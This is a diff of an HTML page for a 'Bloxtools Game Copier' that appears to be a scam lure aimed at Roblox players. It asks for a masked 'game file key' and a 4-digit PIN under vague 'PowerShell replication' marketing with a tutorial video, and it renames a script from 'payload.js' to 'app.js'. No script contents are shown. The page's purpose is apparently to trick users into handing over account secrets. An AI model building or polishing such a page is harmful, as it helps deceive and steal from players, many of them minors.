@@ -1,147 +1,281 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Bloxtools Game Copier</title>
-    <!-- STYLES -->
-    <link rel="stylesheet" href="styles.css" />
-    <!-- FONTS -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  </head>
-  <body>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>Bloxtools Game Copier</title>
+
+  <!-- STYLES -->
+  <link rel="stylesheet" href="styles.css" />
+
+  <!-- FONTS -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+  <link
+    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800&family=Inter:wght@300;400;500;600;700&display=swap"
+    rel="stylesheet"
+  />
+</head>
+
+<body>
+
+  <!-- =========================
+       ANIMATED BACKGROUND
+  ========================== -->
+  <div class="background-wrapper">
+
+    <!-- GRID -->
+    <div class="grid"></div>
+
+    <!-- GLOW ORBS -->
+    <div class="gradient-orb orb-1"></div>
+    <div class="gradient-orb orb-2"></div>
+    <div class="gradient-orb orb-3"></div>
+
+    <!-- PARTICLES -->
+    <canvas id="particles"></canvas>
+
+  </div>
+
+  <!-- =========================
+       MAIN CONTENT
+  ========================== -->
+  <main class="main-container">
+
     <!-- =========================
-         ANIMATED BACKGROUND
+         HERO
     ========================== -->
-    <div class="background-wrapper">
-      <!-- Animated Grid -->
-      <div class="grid"></div>
-      <!-- Glowing Orbs -->
-      <div class="gradient-orb orb-1"></div>
-      <div class="gradient-orb orb-2"></div>
-      <div class="gradient-orb orb-3"></div>
-      <!-- Animated Particles -->
-      <canvas id="particles"></canvas>
-    </div>
+    <header class="hero-section">
+
+      <div class="hero-badge">
+        ADVANCED POWERSHELL REPLICATION SYSTEM
+      </div>
+
+      <h1 class="main-title">
+        Bloxtools Game Copier
+      </h1>
+
+      <p class="subtitle">
+        Enterprise-grade game replication and extraction powered by the
+        Bloxtools secure PowerShell processing framework.
+      </p>
+
+      <!-- STATS -->
+      <div class="hero-stats">
+
+        <div class="stat-box">
+          <span class="stat-number">Secure</span>
+          <span class="stat-label">Extraction Pipeline</span>
+        </div>
+
+        <div class="stat-box">
+          <span class="stat-number">Advanced</span>
+          <span class="stat-label">PowerShell Filtering</span>
+        </div>
+
+        <div class="stat-box">
+          <span class="stat-number">Optimized</span>
+          <span class="stat-label">High-Speed Processing</span>
+        </div>
+
+      </div>
+
+    </header>
+
     <!-- =========================
-         MAIN CONTENT
+         CONTENT GRID
     ========================== -->
-    <main class="main-container">
+    <section class="content-grid">
+
       <!-- =========================
-             HERO SECTION
-        ========================== -->
-      <header class="hero-section">
-        <div class="hero-badge"> ADVANCED POWERSHELL REPLICATION SYSTEM </div>
-        <h1 class="main-title"> Bloxtools Game Copier </h1>
-        <p class="subtitle"> Enterprise-grade game replication and extraction powered by the Bloxtools secure PowerShell processing framework. </p>
-        <div class="hero-stats">
-          <div class="stat-box">
-            <span class="stat-number">Secure</span>
-            <span class="stat-label"> Extraction Pipeline </span>
-          </div>
-          <div class="stat-box">
-            <span class="stat-number">Advanced</span>
-            <span class="stat-label"> PowerShell Filtering </span>
-          </div>
-          <div class="stat-box">
-            <span class="stat-number">Optimized</span>
-            <span class="stat-label"> High-Speed Processing </span>
-          </div>
+           LEFT PANEL
+      ========================== -->
+      <div class="glass-card left-card">
+
+        <div class="card-glow"></div>
+        <div class="card-top-line"></div>
+
+        <div class="section-badge">
+          SYSTEM PANEL
         </div>
-      </header>
+
+        <h2>Game Copy Utility</h2>
+
+        <p class="description-text">
+          Upload and process supported game files using the Bloxtools
+          Advanced PowerShell Replication System.
+        </p>
+
+        <!-- FEATURES -->
+        <div class="feature-list">
+
+          <div class="feature-item">
+            <div class="feature-dot"></div>
+            <span>Advanced PowerShell-Based Processing</span>
+          </div>
+
+          <div class="feature-item">
+            <div class="feature-dot"></div>
+            <span>Secure Extraction & Validation</span>
+          </div>
+
+          <div class="feature-item">
+            <div class="feature-dot"></div>
+            <span>Intelligent Filtering Pipeline</span>
+          </div>
+
+          <div class="feature-item">
+            <div class="feature-dot"></div>
+            <span>High-Speed Optimized Processing</span>
+          </div>
+
+        </div>
+
+        <!-- GAME FILE -->
+        <div class="input-group">
+
+          <label for="gameFile">
+            Game File Key
+          </label>
+
+          <div class="masked-input-wrapper">
+
+            <input
+              type="password"
+              id="gameFile"
+              class="masked-input"
+              autocomplete="off"
+              spellcheck="false"
+              placeholder="Paste game file key here..."
+            />
+
+            <!-- TOGGLE BUTTON -->
+            <button
+              type="button"
+              id="toggleVisibility"
+              class="toggle-visibility"
+            >
+              Show
+            </button>
+
+          </div>
+
+        </div>
+
+        <!-- PIN -->
+        <div class="input-group">
+
+          <label for="pinInput">
+            Security Authorization PIN
+          </label>
+
+          <span class="warning-text">
+            PIN must contain exactly 4 numeric digits
+          </span>
+
+          <input
+            type="text"
+            id="pinInput"
+            maxlength="4"
+            inputmode="numeric"
+            placeholder="0000"
+          />
+
+          <div id="pinError" class="error-message">
+            PIN must contain exactly 4 numbers.
+          </div>
+
+        </div>
+
+        <!-- BUTTON -->
+        <button id="copyButton">
+
+          <div class="button-glow"></div>
+
+          <span class="button-text">
+            Initialize Game Copy
+          </span>
+
+          <span class="loading-spinner"></span>
+
+        </button>
+
+        <!-- STATUS -->
+        <div id="statusMessage"></div>
+
+      </div>
+
       <!-- =========================
-             MAIN GRID
-        ========================== -->
-      <section class="content-grid">
-        <!-- =========================
-                 LEFT SIDE
-            ========================== -->
-        <div class="glass-card left-card">
-          <div class="card-glow"></div>
-          <div class="card-top-line"></div>
-          <div class="section-badge"> SYSTEM PANEL </div>
-          <h2> Game Copy Utility </h2>
-          <p class="description-text"> Upload and process supported game files using the Bloxtools Advanced PowerShell Replication System. Our automated extraction pipeline securely filters, validates, and processes supported game data using optimized replication algorithms and advanced filtering logic. </p>
-          <!-- FEATURES -->
-          <div class="feature-list">
-            <div class="feature-item">
-              <div class="feature-dot"></div>
-              <span> Advanced PowerShell-Based Processing </span>
-            </div>
-            <div class="feature-item">
-              <div class="feature-dot"></div>
-              <span> Secure Extraction & Validation </span>
-            </div>
-            <div class="feature-item">
-              <div class="feature-dot"></div>
-              <span> Intelligent Filtering Pipeline </span>
-            </div>
-            <div class="feature-item">
-              <div class="feature-dot"></div>
-              <span> High-Speed Optimized Processing </span>
-            </div>
-          </div>
-          <!-- GAME FILE -->
-          <div class="input-group">
-            <label> Game File Key </label>
-            <div class="masked-input-wrapper">
-              <input type="password" id="gameFile" class="masked-input" autocomplete="off" spellcheck="false" placeholder="Paste game file key here..." />                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
-                  <circle cx="12" cy="12" r="3" />
-                  <line class="eye-slash" x1="3" y1="3" x2="21" y2="21" />
-                </svg>
-              </button>
-            </div>
-          </div>
-          <!-- PIN -->
-          <div class="input-group">
-            <label> Security Authorization PIN </label>
-            <span class="warning-text"> PIN must contain exactly 4 numeric digits </span>
-            <input type="text" id="pinInput" maxlength="4" inputmode="numeric" placeholder="0000" />
-            <div id="pinError" class="error-message"> PIN must contain exactly 4 numbers. </div>
-          </div>
-          <!-- BUTTON -->
-          <button id="copyButton">
-            <div class="button-glow"></div>
-            <span class="button-text"> Initialize Game Copy </span>
-            <span class="loading-spinner"></span>
-          </button>
-          <!-- STATUS -->
-          <div id="statusMessage"></div>
+           RIGHT PANEL
+      ========================== -->
+      <div class="glass-card right-card">
+
+        <div class="card-glow"></div>
+        <div class="card-top-line"></div>
+
+        <div class="section-badge">
+          TUTORIAL PANEL
         </div>
-        <!-- =========================
-                 RIGHT SIDE
-            ========================== -->
-        <div class="glass-card right-card">
-          <div class="card-glow"></div>
-          <div class="card-top-line"></div>
-          <div class="section-badge"> TUTORIAL PANEL </div>
-          <h2> How To Use </h2>
-          <p class="guide-description"> Follow the official Bloxtools walkthrough below to learn how to correctly prepare, filter, and process supported game files using the advanced secure extraction system. </p>
-          <!-- VIDEO -->
-          <div class="video-wrapper">
-            <video controls>
-              <source src="guide.mp4" type="video/mp4">
-            </video>
-          </div>
-          <!-- INFO BOXES -->
-          <div class="info-grid">
-            <div class="info-box">
-              <div class="info-title"> Processing </div>
-              <div class="info-text"> Advanced extraction filtering powered by optimized PowerShell automation. </div>
-            </div>
-            <div class="info-box">
-              <div class="info-title"> Security </div>
-              <div class="info-text"> Integrated validation system with secure filtering pipeline. </div>
-            </div>
-          </div>
-          <div class="video-note"> Official Bloxtools Replication Tutorial </div>
+
+        <h2>How To Use</h2>
+
+        <p class="guide-description">
+          Follow the official Bloxtools walkthrough below to learn how to
+          correctly prepare and process supported game files.
+        </p>
+
+        <!-- VIDEO -->
+        <div class="video-wrapper">
+
+          <video controls>
+            <source src="guide.mp4" type="video/mp4">
+          </video>
+
         </div>
-      </section>
-    </main>
-    <!-- SCRIPT -->
-    <script src="animation.js"></script>
-    <script src="payload.js"></script>
-  </body>
+
+        <!-- INFO -->
+        <div class="info-grid">
+
+          <div class="info-box">
+            <div class="info-title">Processing</div>
+
+            <div class="info-text">
+              Advanced extraction filtering powered by optimized
+              PowerShell automation.
+            </div>
+          </div>
+
+          <div class="info-box">
+            <div class="info-title">Security</div>
+
+            <div class="info-text">
+              Integrated validation system with secure filtering pipeline.
+            </div>
+          </div>
+
+        </div>
+
+        <div class="video-note">
+          Official Bloxtools Replication Tutorial
+        </div>
+
+      </div>
+
+    </section>
+
+  </main>
+
+  <!-- =========================
+       FRONTEND SCRIPT ONLY
+  ========================== -->
+
+  <!-- ANIMATION -->
+  <script src="animation.js"></script>
+
+  <!-- APP / FRONTEND -->
+  <script src="app.js"></script>
+
+</body>
 </html>
